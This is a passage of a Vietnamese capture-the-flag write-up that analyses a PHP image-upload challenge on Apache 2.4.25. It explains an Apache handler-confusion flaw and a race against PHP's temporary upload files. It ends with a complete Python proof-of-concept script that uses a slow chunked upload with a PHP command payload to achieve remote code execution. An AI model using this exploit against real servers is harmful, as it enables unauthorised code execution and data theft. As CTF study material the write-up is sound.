@@ -1124,3 +1124,270 @@ lệnh 2: java --add-opens java.xml/com.sun.org.apache.xalan.internal.xsltc.trax
 
 
 
+## 4. DeepSeek Made Me Do It
+ `/forge.php`: cho phép upload ảnh png, jpg, jpeg , theo mô tả - file sau đó được lưu vào folder `/tmp`
+ 
+ `/vault.php`: liệt kê các file ảnh được lưu - có vẻ đúng hơn là list toàn bộ file trong folder `/tmp`
+ 
+ `/mark.php`: nhận một đường dẫn source và trả về verification mark.
+ 
+ `flag.txt` nằm ở thư mục root và không thể truy cập được , tạo một alias giữa `/image` và `/tmp`
+ 
+ ```apacheconf
+Alias /images/ /tmp/
+AccessFileName .htaccess
+<FilesMatch "^\.ht">
+        Require all denied
+</FilesMatch>
+<FilesMatch ".*flag.*">
+        Require all denied
+</FilesMatch>
+ ```
+ 
+ forge.php: xử lý file upload
+ 
+ check MIME bằng getimagesize() 
+```php
+    if ($tmp_name === '' || !is_uploaded_file($tmp_name)) {
+        $notice = 'Choose an image first.';
+    } elseif (!preg_match('/^(png|jpg|jpeg)$/i', $ext)) {
+        $notice = 'Only png, jpg, and jpeg are allowed.';
+    } else {
+        $image_info = @getimagesize($tmp_name);
+        $allowed_mimes = array(
+            'png' => 'image/png',
+            'jpg' => 'image/jpeg',
+            'jpeg' => 'image/jpeg',
+        );
+```
+
+Sau đó đọc toàn bộ tempfile, để áp dụng blacklist 
+```php
+if (preg_match('/<\?php|<\?=|scandir|closedir|readdir|move_uploaded_file/is', $content)) {
+    $notice = 'no hack!';
+}
+```
+Nếu pass, file được move vào ``/tmp/<random>.<ext>`
+```php=
+$new_filename = bin2hex(random_bytes(12)) . '.' . $ext;
+$file_path = $base_dir . $new_filename;
+move_uploaded_file($tmp_name, $file_path)
+```
+Validate file upload rất chặt, ta không thể upload shell .php từ đây được
+
+vault.php có hai chức năng:
+
+cho phép đọc file trong `/tmp` qua `$_GET['view']` và liệt kê file :
+```php=
+if ($handle = opendir('/tmp/')) {
+    while (false !== ($entry = readdir($handle))) {
+        $path = '/tmp/' . $entry;
+
+        if ($entry !== '.' && $entry !== '..' && is_file($path)) {
+            $files[] = $entry;
+        }
+    }
+}
+```
+ở đây nó không chỉ list file được upload mà là toàn bộ file xuất hiện trong thư mục `/tmp`
+
+
+
+Cấu hình ở vhost:
+```config=
+<VirtualHost *:80>
+
+        ServerAdmin webmaster@localhost
+        DocumentRoot /var/www/html
+        RewriteEngine On
+        RewriteRule  ^(.+\.php)$  $1  [H=application/x-httpd-php]  ## ở đây
+        LogLevel trace8
+
+        ErrorLog ${APACHE_LOG_DIR}/error.log
+        CustomLog ${APACHE_LOG_DIR}/access.log combined
+
+</VirtualHost>
+
+```
+
+Cấu hình khá giống [this blog](https://blog.orange.tw/posts/2024-08-confusion-attacks-en/) hoạt động < `2.4.60`
+```
+root@6408499d0314:/var/www/html# apache2 -v
+Server version: Apache/2.4.25 (Debian)
+
+```
+Theo như blog thì chỉ cần `/path/to/malicious_file.extension%3Fhehe.php ` thì sẽ xử dụng php handler nhưng lại truy cập file `malicious_file.extension`.
+
+Truy cập container tạo file a.txt với nội dung `<?php echo "quandz" ; ?>` rồi truy cập thấy nó hoạt động.
+![image](https://hackmd.io/_uploads/rk9xocRcMe.png)
+
+![image](https://hackmd.io/_uploads/B19Ws50qzl.png)
+
+Ở version này thì có thể truy cập 1 file thông qua absolute path rồi mới đến đến root web
+```C=
+    if(!(conf->options & OPTION_LEGACY_PREFIX_DOCROOT)) {
+        uri_reduced = apr_table_get(r->notes, "mod_rewrite_uri_reduced");
+    }
+
+    if (!prefix_stat(r->filename, r->pool) || uri_reduced != NULL) {     // <------ [1] access without root
+        int res;
+        char *tmp = r->uri;
+
+        r->uri = r->filename;
+        res = ap_core_translate(r);             // <------ [2] access with root
+        r->uri = tmp;
+
+        if (res != OK) {
+            rewritelog((r, 1, NULL, "prefixing with document_root of %s"
+                        " FAILED", r->filename));
+
+            return res;
+        }
+
+        rewritelog((r, 2, NULL, "prefixed with document_root to %s",
+                    r->filename));
+    }
+
+    rewritelog((r, 1, NULL, "go-ahead with %s [OK]", r->filename));
+    return OK;
+}
+
+
+```
+
+
+Sẽ có 1 ý tưởng: sử dụng socket để upload file có nội dụng `<?=cat /var/www/html/flag.txt?>` gửi từng chunked byte để kéo dài request . Trong lúc upload file thì sẽ có 1 file tạm được tạo ở `/tmp` chạy race condition truy cập file đó để rce đọc được flag.
+
+POC:
+```python=
+import re
+import socket
+import threading
+import time
+import urllib.error
+import urllib.parse
+import urllib.request
+
+
+BASE_URL = "http://127.0.0.1:45801"
+RACE_SECONDS = 25
+CHUNK_DELAY = 0.05
+BODY_SIZE = 1024 * 1024
+
+PAYLOAD = b'<?=`cat /var/www/html/flag.txt`?>\n'
+
+
+def http_get(url, timeout=1.0):
+    req = urllib.request.Request(url, headers={"Connection": "close"})
+    with urllib.request.urlopen(req, timeout=timeout) as res:
+        return res.read().decode("utf-8", "ignore")
+
+
+def send_slow_upload(stop_event):
+    parsed = urllib.parse.urlparse(BASE_URL)
+    host = parsed.hostname
+    port = parsed.port or 80
+
+    preamble = (
+        f"------geckoformboundarye02924a7e2ab0becd5fae11fa00e642b\r\n"
+        'Content-Disposition: form-data; name="seal"\r\n\r\n'
+        "1\r\n"
+        f"------geckoformboundarye02924a7e2ab0becd5fae11fa00e642b\r\n"
+        'Content-Disposition: form-data; name="ext"\r\n\r\n'
+        "png\r\n"
+        f"------geckoformboundarye02924a7e2ab0becd5fae11fa00e642b\r\n"
+        'Content-Disposition: form-data; name="image"; filename="x.png"\r\n'
+        "Content-Type: application/octet-stream\r\n\r\n"
+    ).encode()
+
+    epilogue = f"\r\n------geckoformboundarye02924a7e2ab0becd5fae11fa00e642b--\r\n".encode()
+    filler_size = max(0, BODY_SIZE - len(PAYLOAD))
+    content_length = len(preamble) + len(PAYLOAD) + filler_size + len(epilogue)
+
+    request = (
+        "POST /forge.php HTTP/1.1\r\n"
+        f"Host: {host}:{port}\r\n"
+        f"Content-Type: multipart/form-data; boundary=----geckoformboundarye02924a7e2ab0becd5fae11fa00e642b\r\n"
+        f"Content-Length: {content_length}\r\n"
+        "Connection: close\r\n\r\n"
+    ).encode()
+
+    with socket.create_connection((host, port), timeout=3) as sock:
+        sock.sendall(request)
+        sock.sendall(preamble)
+        sock.sendall(PAYLOAD)
+
+        sent = 0
+        chunk = b"A" * 2048
+
+        while sent < filler_size and not stop_event.is_set():
+            n = min(len(chunk), filler_size - sent)
+            sock.sendall(chunk[:n])
+            sent += n
+            time.sleep(CHUNK_DELAY)
+
+        if sent < filler_size:
+            sock.sendall(b"A" * (filler_size - sent))
+
+        sock.sendall(epilogue)
+
+
+def extract_tmp_names(vault_html):
+    names = re.findall(r"/images/([^\"?<>]+)", vault_html)
+
+    for name in names:
+        decoded = urllib.parse.unquote(name)
+        if re.fullmatch(r"php[A-Za-z0-9._-]+", decoded):
+            yield decoded
+
+
+def main():
+    stop_event = threading.Event()
+
+    worker = threading.Thread(
+        target=send_slow_upload,
+        args=(stop_event,),
+        daemon=True,
+    )
+    worker.start()
+
+    deadline = time.time() + RACE_SECONDS
+    seen = set()
+
+    while time.time() < deadline:
+        try:
+            html = http_get(f"{BASE_URL}/vault.php")
+        except (OSError, urllib.error.URLError):
+            time.sleep(0.05)
+            continue
+
+        for tmp_name in extract_tmp_names(html):
+            if tmp_name in seen:
+                continue
+
+            seen.add(tmp_name)
+            exploit_url = (
+                f"{BASE_URL}/tmp/{urllib.parse.quote(tmp_name)}%3f.php"
+            )
+
+            try:
+                body = http_get(exploit_url)
+            except (OSError, urllib.error.URLError):
+                continue
+
+            match = re.search(r"KMACTF\{[^}\r\n]+\}", body)
+            if match:
+                stop_event.set()
+                print(match.group(0))
+                print(f"exploit_url={exploit_url}")
+                return
+
+        time.sleep(0.05)
+
+    stop_event.set()
+    raise SystemExit("flag not recovered; increase RACE_SECONDS or CHUNK_DELAY")
+
+
+if __name__ == "__main__":
+    main()
+```
